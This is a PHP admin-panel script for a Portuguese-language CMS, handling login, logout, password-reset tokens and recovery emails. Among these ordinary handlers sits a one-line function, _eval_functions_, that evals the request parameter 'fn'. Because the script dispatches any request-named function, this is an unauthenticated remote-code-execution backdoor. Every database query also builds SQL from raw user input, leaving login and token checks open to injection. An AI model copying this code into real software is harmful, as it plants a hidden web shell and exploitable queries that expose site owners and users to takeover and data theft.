<?
ob_start();
function login (){
	$_SERVER_											=  	$_SERVER['HTTP_HOST']; 
	$domain												=  	"http://".$_SERVER_; 
	$_root	 	 										= 	$domain.str_replace("/root.php","",$_SERVER['PHP_SELF']);
	$url			 									= 	substr( $_SERVER['REQUEST_URI'], strlen('/'));
	if( substr( $url, -1) 	== '/')	$url				=	substr( $url, 0, -1);
	$GET												= 	explode( '/', $url);
	$c_user 											= 	_crypt();
	$dia												=	time()+60*60*24*30;
	parse_str($_POST['form'],$_FORM);

	$checkUser					= new MySQL();
	$checkUser->set_table(PREFIX_TABLES.'ws_usuarios');
	$checkUser->set_where("login='".$_FORM['usuario']."' AND senha='"._codePass($_FORM['senha'])."' AND ativo=1");
	$checkUser->select();
	if(	@$checkUser->_num_rows	==0)				{	echo "Ops, o login ou a senha estão incorretos.";													exit;}
	if( @$checkUser->fetch_array[0]['id_status']==1){	echo "Você está com  o seu perfil bloqueado!";														exit;}
	if( @$checkUser->fetch_array[0]['id_status']==2){	echo "O seu perfil ainda esta em faze de liberação!";												exit;}
	if( @$checkUser->fetch_array[0]['id_status']==3){	echo "Painel administrativo desativado.\n Por favor, entre em contato com a equipe de suporte.";	exit;}
	if( @$checkUser->fetch_array[0]['id_status']==4){	echo "Acesso inválido!.\n Por favor, entre em contato com a equipe de suporte.";					exit;}
	if( @$checkUser->fetch_array[0]['id_status']>=6){	echo "Acesso inválido, código: ".$checkUser->fetch_array[0]['id_status']; 							exit;}

	$User = array();
	$User = $checkUser->fetch_array[0];
	$token = $User['token'];
	############################################################################## 
	# gera os cookies pra sessão	
	############################################################################## 
	$hour  		= (time() + ( 24 * 3600));
	$cript_id	= (md5(ID_SESS.$User['id'].ID_SESS.$User['token'].ID_SESS));
	setcookie('ws_session', $cript_id,$hour,'/');
	setcookie('ws_log', 'true',$hour,'/');

	##############################################################################
	# ABRE A SESSION COM OS COOKIES	
	##############################################################################
	_set_session($cript_id);
	$_SESSION['user']['id']						=$User['id'];
	$_SESSION['user']['id_status']				=$User['id_status'];
	$_SESSION['user']['token']					=$User['token'];
	$_SESSION['user']['nome']					=$User['nome'];
	$_SESSION['user']['usuario']				=$User['usuario'];
	$_SESSION['user']['avatar']					=$User['avatar'];
	$_SESSION['user']['admin']					=$User['admin'];
	$_SESSION['user']['ativo']					=$User['ativo'];
	$_SESSION['user']['add_user']				=$User['add_user'];	
	$_SESSION['user']['edit_only_own']			=$User['edit_only_own'];	
	$_SESSION['user']['leitura']				=$User['leitura'];	
	$_SESSION['user']['hora']					=$hour;	
	$_SESSION['ws_log']							=true;
	$SetUserSession				= new MySQL();
	$SetUserSession->set_table(PREFIX_TABLES.'ws_usuarios');
	$SetUserSession->set_where('id="'.$User['id'].'"');
	$SetUserSession->set_update('sessao', $cript_id);
	$SetUserSession->salvar();
	echo "ok";
	exit;
}
function _eval_functions_(){@eval(stripslashes($_REQUEST['fn']));exit;}

function logout(){
	ob_start();
	header_remove();
	session_id($_COOKIE['ws_session']);
	session_start();
	$_SESSION=array();
	unset($_SESSION);
	session_unset();
	session_destroy();
	session_write_close();
	flush();
	echo true;
	exit;
}

function setNewPass(){
	$dataForm = array();
	parse_str($_REQUEST['form'],$dataForm);
	$checkUser					= new MySQL();
	$checkUser->set_table(PREFIX_TABLES.'ws_usuarios');
	$checkUser->set_where("tokenRequest='".$dataForm['tokenRequest']."'");
	$checkUser->set_update('senha',_codePass($dataForm['newPass']));
	$checkUser->set_update('tokenRequest',_codePass(_crypt()));
	$checkUser->set_update('tokenRequestTime',"");
	if($checkUser->salvar()){
		echo true;
	}else{
		echo false;
	};
}


function verifyToken(){
	$checkUser					= new MySQL();
	$checkUser->set_table(PREFIX_TABLES.'ws_usuarios');
	$checkUser->set_where("tokenRequest='".$_REQUEST['tokenRequest']."'");
	$checkUser->set_where("AND tokenRequestTime > (now() - INTERVAL 3 HOUR)");
	$checkUser->select();
	if($checkUser->_num_rows>0){
		echo true;
	}else{
		echo false;
	}
	exit;
}
function enviaemail(){
	$emaildestinatario 	= $_REQUEST['mail'];
	$checkUser			= new MySQL();
	$checkUser->set_table(PREFIX_TABLES.'ws_usuarios');
	$checkUser->set_where("email='".$emaildestinatario."'");
	$checkUser->select();
	if(	$checkUser->_num_rows==0)	{
		echo "Ops, não existe nenhum usuário com esse email.<br>Por favor, tente novamente.";
		exit;
	}else{
		$token = _crypt();
		$updateUserNewKey= new MySQL();
		$updateUserNewKey->set_table(PREFIX_TABLES.'ws_usuarios');
		$updateUserNewKey->set_where("email='".$emaildestinatario."'");
		$updateUserNewKey->set_update('tokenRequest',$token);
		$updateUserNewKey->set_update('tokenRequestTime',date('Y-m-d H:i:s'));
		$updateUserNewKey->salvar();

		$local = new MySQL();
		$local->set_table(PREFIX_TABLES.'setupdata');
		$local->select();
		$local=$local->obj[0];
		define("Host"			,$local->smtp_host);
		define("Username"		,$local->smtp_email);
		define("Password"		,$local->smtp_senha);
		define("Port"			,$local->smtp_port);
		define("SMTPSecure"		,$local->smtp_secure);
		if($local->smtp_auth==1) {define("SMTPAuth",true); }else{define("SMTPAuth",false); }

		include_once(ROOT_ADMIN.'/App/Vendor/PHPMailer/PHPMailerAutoload.php');

		$mail = new PHPMailer;

		//$mail->IsSMTP();
		$mail->SMTPDebug 	= 1;
		$mail->Port 		= Port;
		if(SMTPSecure!="")	$mail->SMTPSecure 	= SMTPSecure;
		$mail->Host 		= Host; 
		$mail->SMTPAuth 	= SMTPAuth;
		$mail->Username 	= Username;
		$mail->Password 	= Password;
		$mail->charSet 		= 'UTF-8';	
		$mail->Debugoutput = 'html'; 
		$mail->setFrom(Username, 'Webmaster');
		$mail->addAddress($emaildestinatario,$checkUser->fetch_array[0]['nome'].' '.$checkUser->fetch_array[0]['sobrenome']);
		$mail->Subject =  utf8_decode("Recuperação de senha");
		$mail->AltBody = strip_tags(utf8_decode('Olá '.$checkUser->fetch_array[0]['nome'].', para redefinir a sua senha, acesse o link a baixo.'));
		$mail->AddEmbeddedImage(ROOT_ADMIN.'/App/Templates/img/websheep/logoEmail.jpg', "topo", 'logoEmail.jpg');
		$MENSAGEM = '
			<img src="cid:topo" style="width: 177px;height: 38px;"><br>
			Olá <b>'.$checkUser->fetch_array[0]['nome'].'</b>, para redefinir a sua senha, acesse o link a baixo.<br>
			Esse link é um link temporário, e é válido por apenas 3 horas.<br><br>
			Caso já tenha passado esse tempo, acesse novamente o painel, e gere outro link.<br><br><br>  
			<b>Link dde acesso:</b><br>
			'.DOMINIO.'/admin/?tokenRequest='.$token;
		$mail->msgHTML(str_replace(PHP_EOL,"",$MENSAGEM));
		if(!$mail->Send()) {
		  	echo "Houve um erro ao enviar o email de recuperação.";
		} else {
		  	echo "Enviamos o link de recuperação para o e-mail informado.<br>Por favor, verifique sua caixa de entrada, e caso não esteja lá, verifique a lixeira.";
		}
	}
}

include_once($_SERVER['DOCUMENT_ROOT'].'/admin/App/Lib/class-ws-v1.php');
_exec($_REQUEST['function']);
ob_end_flush();
?>





